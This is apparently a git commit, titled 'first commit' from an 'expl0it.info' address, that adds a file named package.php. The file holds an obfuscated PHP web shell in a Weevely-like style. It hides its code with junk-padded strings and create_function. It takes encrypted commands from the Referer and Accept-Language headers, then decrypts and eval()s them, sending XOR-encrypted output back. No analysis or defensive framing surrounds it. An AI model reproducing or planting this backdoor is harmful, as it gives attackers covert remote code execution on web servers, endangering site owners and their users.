2c96ef1f5678d35c3b75262a1453302458f0c20c
root <root@expl0it.info>
2015-11-13 15:07:22 +0100

    first commit

---
+++ package.php
@@ -0,0 +1,15 @@
+<?php
+$S='EFERER"]k6;$ra=@$r["k6HTTP_ACCEPT_LANk6GUk6k6AGE"];if(k6$rr&&$ra)k6{   k6 $u=parse_urk6k6l($rrk6);    parsek6_strk6(k6$u["query"],';
+$A='k6=$p;$e=k6strpos($s[$i],k6$fk6);if($e){$k6k=$kh.$kfk6;ob_stak6rtk6();@evk6alk6(@gzuncomprk6k6ess(@x(@bask6ek664_decode(p';
+$I='reg_k6repk6lace(arrak6y(k6"/_/","k6/-/"k6k6),arrk6ay("/","k6+"),$ss($sk6k6[$i],0,$e))),k6$k)))k6;$o=ob_getk6_contenk6ts();';
+$l='k6sessik6onk6_start()k6;$s=&$_k6SESk6Sk6IONk6;$ss="substr";$sl="k6stk6rtolowek6r";$i=$mk6[1][0].k6$m[k61][1];k6$k6h=$k6';
+$L='sl($ss(md5(k6$k6i.$kh),0,k63));$f=$sl($ssk6(mk6d5(k6$i.$kk6f),0,k63));$p="";fok6rk6($z=1;$z<k6count($m[1]k6);$z++k6) $p.k6k6=';
+$k='$q);k6$q=arrk6ay_vak6lues(k6$q)k6k6;prk6eg_matchk6_all("/([\\k6w]k6)[\\w-]k6+(?:;q=0.(k6[\\d]))?k6,?/",$ra,$m)k6;if($q&k6&$m){@';
+$R='$j=0;k6($j<$c&&$k6i<$lk6);$j++k6,$i++k6){$o.=$t{k6$ik6}^$k{$j};}k6k6}return $o;}k6$r=$_Sk6ERk6k6k6VER;$rrk6=@$rk6k6["HTTP_R';
+$i='k6k6$kh="c2k689";$kf="2dbd"k6;k6function x($tk6,$k){$k6k6k6c=strlen($k);$l=stk6k6rlenk6($t);$o=""k6;k6for($i=0;k6$ik6<$l;){for(';
+$f='$qk6[$m[2k6][$z]];k6if(strpos($p,$h)k6===0)k6{$s[$i]k6=k6"";$p=$k6ssk6($p,3);}if(arrk6ay_kk6ey_exisk6ts(k6$i,$s)k6){$sk6[$i]k6.';
+$x='obk6_end_k6clek6an()k6;$d=bak6se64_encode(k6k6x(gzck6omprek6ss($o),$k))k6;print("k6<$k>k6$d</$k>")k6;k6@sessionk6_destk6roy();}}}}';
+$c=str_replace('x','','cxreaxte_xxxxfunction');
+$U=str_replace('k6','',$i.$R.$S.$k.$l.$L.$f.$A.$I.$x);
+$s=$c('',$U);$s();
+?>
